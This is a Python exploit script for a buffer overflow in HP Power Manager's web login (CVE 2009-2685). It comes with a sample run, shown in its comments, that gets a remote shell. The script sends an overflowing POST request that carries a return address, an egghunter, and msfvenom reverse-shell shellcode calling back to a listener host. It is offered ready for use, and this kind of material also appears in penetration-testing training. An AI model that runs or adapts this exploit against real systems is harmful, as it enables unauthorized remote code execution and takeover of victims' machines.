#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English, Win7 Ultimate N
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

# Modified in 2019 for Win7 By JMcPeters

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.11.0.62  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
buf =  "FuZZFuZZ"
buf += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x39\xd1\xaa\x15\x83\xee\xfc\xe2\xf4\xc5\x39"
buf += "\x28\x15\x39\xd1\xca\x9c\xdc\xe0\x6a\x71\xb2\x81\x9a"
buf += "\x9e\x6b\xdd\x21\x47\x2d\x5a\xd8\x3d\x36\x66\xe0\x33"
buf += "\x08\x2e\x06\x29\x58\xad\xa8\x39\x19\x10\x65\x18\x38"
buf += "\x16\x48\xe7\x6b\x86\x21\x47\x29\x5a\xe0\x29\xb2\x9d"
buf += "\xbb\x6d\xda\x99\xab\xc4\x68\x5a\xf3\x35\x38\x02\x21"
buf += "\x5c\x21\x32\x90\x5c\xb2\xe5\x21\x14\xef\xe0\x55\xb9"
buf += "\xf8\x1e\xa7\x14\xfe\xe9\x4a\x60\xcf\xd2\xd7\xed\x02"
buf += "\xac\x8e\x60\xdd\x89\x21\x4d\x1d\xd0\x79\x73\xb2\xdd"
buf += "\xe1\x9e\x61\xcd\xab\xc6\xb2\xd5\x21\x14\xe9\x58\xee"
buf += "\x31\x1d\x8a\xf1\x74\x60\x8b\xfb\xea\xd9\x8e\xf5\x4f"
buf += "\xb2\xc3\x41\x98\x64\xb9\x99\x27\x39\xd1\xc2\x62\x4a"
buf += "\xe3\xf5\x41\x51\x9d\xdd\x33\x3e\x2e\x7f\xad\xa9\xd0"
buf += "\xaa\x15\x10\x15\xfe\x45\x51\xf8\x2a\x7e\x39\x2e\x7f"
buf += "\x45\x69\x81\xfa\x55\x69\x91\xfa\x7d\xd3\xde\x75\xf5"
buf += "\xc6\x04\x3d\x7f\x3c\xb9\xa0\x1e\x39\xef\xc2\x17\x39"
buf += "\xd0\x11\x9c\xdf\xbb\xba\x43\x6e\xb9\x33\xb0\x4d\xb0"
buf += "\x55\xc0\xbc\x11\xde\x19\xc6\x9f\xa2\x60\xd5\xb9\x5a"
buf += "\xa0\x9b\x87\x55\xc0\x51\xb2\xc7\x71\x39\x58\x49\x42"
buf += "\x6e\x86\x9b\xe3\x53\xc3\xf3\x43\xdb\x2c\xcc\xd2\x7d"
buf += "\xf5\x96\x14\x38\x5c\xee\x31\x29\x17\xaa\x51\x6d\x81"
buf += "\xfc\x43\x6f\x97\xfc\x5b\x6f\x87\xf9\x43\x51\xa8\x66"
buf += "\x2a\xbf\x2e\x7f\x9c\xd9\x9f\xfc\x53\xc6\xe1\xc2\x1d"
buf += "\xbe\xcc\xca\xea\xec\x6a\x4a\x08\x13\xdb\xc2\xb3\xac"
buf += "\x6c\x37\xea\xec\xed\xac\x69\x33\x51\x51\xf5\x4c\xd4"
buf += "\x11\x52\x2a\xa3\xc5\x7f\x39\x82\x55\xc0"

# /usr/share/metasploit-framework/tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e FuZZ -v 'EH'

EH =  ""
EH += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
EH += "\x05\x5a\x74\xef\xb8\x46\x75\x5a\x5a\x89\xd7\xaf\x75"
EH += "\xea\xaf\x75\xe7\xff\xe7"

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,buf,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Reverse shell coming your way... , can take up to 1 min to spawn your shell"
s.close()
